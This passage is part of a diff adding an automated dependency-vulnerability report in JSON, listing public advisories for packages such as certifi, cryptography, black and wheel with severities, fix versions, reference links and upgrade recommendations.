+        "recommendation": "Upgrade to 2024.7.4 or later",
+        "fixAvailableSince": "2025-02-13T00:55:06.046Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-39689"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/certifi/python-certifi"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2024-230.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20241206-0001"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-5cpq-8wj7-hf2v",
+      "severity": "LOW",
+      "severityScore": 2.5,
+      "cvssScores": [],
+      "aliases": [],
+      "summary": "Vulnerable OpenSSL included in cryptography wheels",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-02T17:13:10Z",
+        "modifiedDate": "2024-11-28T05:35:51.956467Z",
+        "daysSincePublished": 929
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "41.0.0",
+        "recommendation": "Upgrade to 41.0.0 or later",
+        "fixAvailableSince": "2024-11-28T05:35:51.956Z",
+        "daysSinceFix": 384,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-5cpq-8wj7-hf2v"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/8708245ccdeaff21d65eea68a4f8d2a7c5949a22"
+        },
+        {
+          "type": "WEB",
+          "url": "https://cryptography.io/en/latest/changelog/#v41-0-0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jm77-qphf-c4w8",
+      "severity": "LOW",
+      "severityScore": 2.5,
+      "cvssScores": [],
+      "aliases": [],
+      "summary": "pyca/cryptography's wheels include vulnerable OpenSSL",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-08-01T22:34:41Z",
+        "modifiedDate": "2024-12-03T06:10:50.110979Z",
+        "daysSincePublished": 868
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "41.0.3",
+        "recommendation": "Upgrade to 41.0.3 or later",
+        "fixAvailableSince": "2024-12-03T06:10:50.110Z",
+        "daysSinceFix": 379,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jm77-qphf-c4w8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/b22271cf3c3dd8dc8978f8f4b00b5c7060b6538d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/bfa4d95f0f356f2d535efd5c775e0fb3efe90ef2"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.openssl.org/news/secadv/20230714.txt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.openssl.org/news/secadv/20230719.txt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.openssl.org/news/secadv/20230731.txt"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v8gr-m533-ghj9",
+      "severity": "LOW",
+      "severityScore": 2.5,
+      "cvssScores": [],
+      "aliases": [],
+      "summary": "Vulnerable OpenSSL included in cryptography wheels",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-09-21T17:07:01Z",
+        "modifiedDate": "2024-12-04T05:35:39.163640Z",
+        "daysSincePublished": 818
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "41.0.4",
+        "recommendation": "Upgrade to 41.0.4 or later",
+        "fixAvailableSince": "2024-12-04T05:35:39.163Z",
+        "daysSinceFix": 378,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-v8gr-m533-ghj9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/fc11bce6930e591ce26a2317b31b9ce2b3e25512"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2024-48",
+      "severity": "LOW",
+      "severityScore": 0,
+      "cvssScores": [],
+      "aliases": [
+        "CVE-2024-21503",
+        "GHSA-fj7x-q9j7-g6q6"
+      ],
+      "summary": "No summary available",
+      "details": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\r\rExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.",
+      "cwes": [],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-03-19T05:15:00Z",
+        "modifiedDate": "2024-03-20T15:41:52.204760Z",
+        "daysSincePublished": 638
+      },
+      "affected": {
+        "package": "black",
+        "version": "22.3.0",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "22.3.0",
+        "fixedIn": "f00093672628d212b8965a8993cee8bedf5fe9b8",
+        "recommendation": "Upgrade to f00093672628d212b8965a8993cee8bedf5fe9b8 or later",
+        "fixAvailableSince": "2024-03-20T15:41:52.204Z",
+        "daysSinceFix": 637,
+        "monthsSinceFix": 21,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/psf/black/releases/tag/24.3.0"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2022-42986",
+      "severity": "LOW",
+      "severityScore": 0,
+      "cvssScores": [],
+      "aliases": [
+        "CVE-2022-23491",
+        "GHSA-43fp-rhv2-5gv8"
+      ],
+      "summary": "No summary available",
+      "details": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi 2022.12.07 removes root certificates from \"TrustCor\" from the root store. These are in the process of being removed from Mozilla's trust store. TrustCor's root certificates are being removed pursuant to an investigation prompted by media reporting that TrustCor's ownership also operated a business that produced spyware. Conclusions of Mozilla's investigation can be found in the linked google group discussion.",
+      "cwes": [],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-12-07T22:15:00Z",
+        "modifiedDate": "2023-11-08T04:08:19.066843Z",
+        "daysSincePublished": 1105
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "2022.12.7",
+        "recommendation": "Upgrade to 2022.12.7 or later",
+        "fixAvailableSince": "2023-11-08T04:08:19.066Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-43fp-rhv2-5gv8"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2023-135",
+      "severity": "LOW",
+      "severityScore": 0,
+      "cvssScores": [],
+      "aliases": [
+        "CVE-2023-37920",
+        "GHSA-xqr8-7jwr-rhp7"
+      ],
+      "summary": "No summary available",
+      "details": "Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store. These are in the process of being removed from Mozilla's trust store. e-Tugra's root certificates are being removed pursuant to an investigation prompted by reporting of security issues in their systems.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-08-03T19:36:12Z",
+        "modifiedDate": "2023-11-08T04:13:04.801823Z",
+        "daysSincePublished": 867
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "2023.7.22",
+        "recommendation": "Upgrade to 2023.7.22 or later",
+        "fixAvailableSince": "2023-11-08T04:13:04.801Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/commit/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37920"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-xqr8-7jwr-rhp7"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2022-43017",
+      "severity": "LOW",
+      "severityScore": 0,
+      "cvssScores": [],
+      "aliases": [
+        "CVE-2022-40898",
+        "GHSA-qwmp-2cf2-g9g6"
+      ],
+      "summary": "No summary available",
+      "details": "An issue discovered in Python Packaging Authority (PyPA) Wheel 0.37.1 and earlier allows remote attackers to cause a denial of service via attacker controlled input to wheel cli.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-12-23T00:15:00Z",
+        "modifiedDate": "2023-11-08T04:10:26.104708Z",
+        "daysSincePublished": 1090
+      },
+      "affected": {
+        "package": "wheel",
+        "version": "0.37.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.37.1",
+        "fixedIn": "0.38.1",
+        "recommendation": "Upgrade to 0.38.1 or later",
+        "fixAvailableSince": "2023-11-08T04:10:26.104Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://pypi.org/project/wheel/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/wheel/blob/main/src/wheel/wheelfile.py#L18"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://pyup.io/posts/pyup-discovers-redos-vulnerabilities-in-top-python-packages/"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "black",
+      "currentVersion": "22.3.0",
+      "fixedIn": "f00093672628d212b8965a8993cee8bedf5fe9b8",
+      "vulnerabilities": [
+        "PYSEC-2024-48",
+        "GHSA-fj7x-q9j7-g6q6"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to f00093672628d212b8965a8993cee8bedf5fe9b8 or later",
+      "fixAvailableSince": "2024-03-20T15:41:52.204Z",
+      "daysSinceFix": 637,
+      "monthsSinceFix": 21,
+      "isOldFix": true
+    },
+    {
+      "package": "certifi",
+      "currentVersion": "2022.5.18.1",
+      "fixedIn": "2022.12.7",
+      "vulnerabilities": [
+        "PYSEC-2022-42986",
+        "PYSEC-2023-135",
+        "PYSEC-2024-230",
+        "GHSA-248v-346w-9cwc",
+        "GHSA-43fp-rhv2-5gv8",
+        "GHSA-xqr8-7jwr-rhp7"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2022.12.7 or later",
+      "fixAvailableSince": "2023-11-08T04:08:19.066Z",
+      "daysSinceFix": 770,
+      "monthsSinceFix": 25,
+      "isOldFix": true
+    },
+    {
+      "package": "cipher-base",
+      "currentVersion": "1.0.4",
+      "fixedIn": "1.0.5",
+      "vulnerabilities": [
+        "GHSA-cpq7-6gpm-g9rc"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.0.5 or later",
+      "fixAvailableSince": "2025-11-03T21:34:22.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "cryptography",
+      "currentVersion": "37.0.2",
+      "fixedIn": "f09c261ca10a31fe41b1262306db7f8f1da0e48a",
+      "vulnerabilities": [
+        "PYSEC-2023-254",
+        "GHSA-39hc-v87j-747x",
+        "GHSA-3ww4-gg4f-jr7f",
+        "GHSA-5cpq-8wj7-hf2v",
+        "GHSA-9v9h-cgj8-h64p",
+        "GHSA-h4gh-qq45-vh27",
+        "GHSA-jfhm-5ghh-2f97",
+        "GHSA-jm77-qphf-c4w8",
+        "GHSA-v8gr-m533-ghj9",
+        "GHSA-w7pp-m8wf-vj6r",
+        "GHSA-x4qr-2fvf-3mr5"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to f09c261ca10a31fe41b1262306db7f8f1da0e48a or later",
+      "fixAvailableSince": "2024-02-17T07:41:40.326Z",
+      "daysSinceFix": 669,
+      "monthsSinceFix": 22,
+      "isOldFix": true
+    },
+    {
+      "package": "glob",
+      "currentVersion": "10.4.5",
+      "fixedIn": "11.1.0",
+      "vulnerabilities": [
+        "GHSA-5j98-mcp5-4vw2"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 11.1.0 or later",
+      "fixAvailableSince": "2025-11-19T02:30:52.000Z",
+      "daysSinceFix": 28,
+      "monthsSinceFix": 0,
+      "isOldFix": false
+    },
+    {
+      "package": "got",
+      "currentVersion": "8.3.2",
+      "fixedIn": "12.1.0",
+      "vulnerabilities": [
+        "GHSA-pfrx-2q88-qq97"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 12.1.0 or later",
+      "fixAvailableSince": "2023-11-08T04:09:41.125Z",
+      "daysSinceFix": 770,
+      "monthsSinceFix": 25,
+      "isOldFix": true
+    },
+    {
+      "package": "h11",
+      "currentVersion": "0.12.0",
+      "fixedIn": "0.16.0",
+      "vulnerabilities": [
+        "GHSA-vqfr-h8mv-ghfj"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 0.16.0 or later",
+      "fixAvailableSince": "2025-04-24T22:22:25.803Z",
+      "daysSinceFix": 236,
+      "monthsSinceFix": 7,
+      "isOldFix": true
+    },
+    {
+      "package": "http-cache-semantics",
+      "currentVersion": "3.8.1",
+      "fixedIn": "4.1.1",
+      "vulnerabilities": [
+        "GHSA-rc47-6667-2j5j"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.1.1 or later",
+      "fixAvailableSince": "2025-02-13T19:01:49.374Z",
+      "daysSinceFix": 307,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    },
+    {
+      "package": "idna",
+      "currentVersion": "3.3",
+      "fixedIn": "1d365e17e10d72d0b7876316fc7b9ca0eebdd38d",
+      "vulnerabilities": [
+        "PYSEC-2024-60",
+        "GHSA-jjg7-2v4v-x38h"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1d365e17e10d72d0b7876316fc7b9ca0eebdd38d or later",
+      "fixAvailableSince": "2024-07-11T17:42:33.704Z",
+      "daysSinceFix": 524,
+      "monthsSinceFix": 17,
+      "isOldFix": true
+    },
+    {
+      "package": "wheel",
+      "currentVersion": "0.37.1",
+      "fixedIn": "0.38.1",
+      "vulnerabilities": [
+        "PYSEC-2022-43017",
+        "GHSA-qwmp-2cf2-g9g6"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 0.38.1 or later",
+      "fixAvailableSince": "2023-11-08T04:10:26.104Z",
+      "daysSinceFix": 770,
+      "monthsSinceFix": 25,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "MEDIUM",
+      "message": "2 vulnerabilities were recently discovered (< 6 months old)."
+    },
+    {
+      "priority": "HIGH",
+      "message": "21 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "28 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
